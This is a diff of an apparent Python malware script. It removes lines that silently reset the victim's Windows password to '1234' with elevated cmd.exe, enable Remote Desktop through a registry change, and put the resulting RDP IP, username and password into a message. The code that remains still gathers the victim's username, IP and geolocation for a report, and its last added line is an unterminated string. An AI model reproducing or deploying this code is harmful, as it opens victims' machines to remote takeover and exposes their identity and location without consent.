@@ -29,14 +29,6 @@ ip_address = socket.gethostbyname(hostname)
 username = get_username_os()
 ip = ipAdd
 
-commands = f'net user {username} 1234'
-
-shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+commands)
-
-commands2 = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
-
-shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+commands2)
-
 
 def get_flag(ip):
 	res = requests.get(f'https://geolocation-db.com/json/{ip}&position=true')
@@ -61,16 +53,8 @@ message = f"```name and ip:[{username}]:[{ip_address}]" \
           f"" \
           f"" \
           f"" \
-          f"                                                                                                                           {username}'s Password is set to:   1234" \
           f"" \
-          f"" \
-          f"" \
-          f"" \
-          f"" \
-          f"" \
-          f"" \
-          f"" \
-          f"                                                                                                             RDP INFO:        IP: {ip}   USERNAME: {username}     PASSWORD: 1234    " \
+          f"                                                                                                           
           f"" \
           f"" \
           f"" \
